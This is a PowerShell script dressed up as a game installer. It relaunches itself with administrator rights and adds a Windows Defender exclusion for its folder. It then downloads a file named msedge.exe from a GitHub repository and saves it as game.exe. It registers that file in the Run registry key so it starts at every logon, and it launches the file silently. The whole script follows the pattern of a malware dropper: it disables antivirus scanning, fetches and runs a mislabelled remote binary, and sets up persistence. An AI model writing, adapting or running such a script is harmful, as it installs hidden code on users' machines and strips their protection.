# Check if running with administrator privileges
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # If not running as admin, restart with admin privileges
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Define specific paths for your game
$gameFolder = "C:\Games\MyGame"  # Change this to your actual game folder
$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$downloadPath = "$gameFolder\game.exe"  # Save the game executable in the game folder
$autoStartName = "MyGame"

# Create the game directory if it doesn't exist
if (-not (Test-Path -Path $gameFolder)) {
    New-Item -ItemType Directory -Path $gameFolder -Force
}

# Add only the specific game folder to Defender exclusions
try {
    Add-MpPreference -ExclusionPath $gameFolder -ErrorAction Stop
    Write-Host "Added exclusion for game folder: $gameFolder"
} catch {
    Write-Host "Could not add exclusion. Continuing anyway."
}

# Download the executable to the game folder
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -ErrorAction Stop
    Write-Host "Downloaded game to: $downloadPath"
} catch {
    Write-Host "Download failed."
    exit
}

# Add to auto-start (optional, comment out if not needed)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
try {
    Set-ItemProperty -Path $regPath -Name $autoStartName -Value "`"$downloadPath`"" -ErrorAction Stop
    Write-Host "Added game to startup programs."
} catch {
    Write-Host "Could not add to startup. Continuing anyway."
}

# Launch the executable
try {
    Start-Process -FilePath $downloadPath -ArgumentList "/silent" -Wait
    Write-Host "Game launched successfully."
} catch {
    Write-Host "Failed to launch game."
}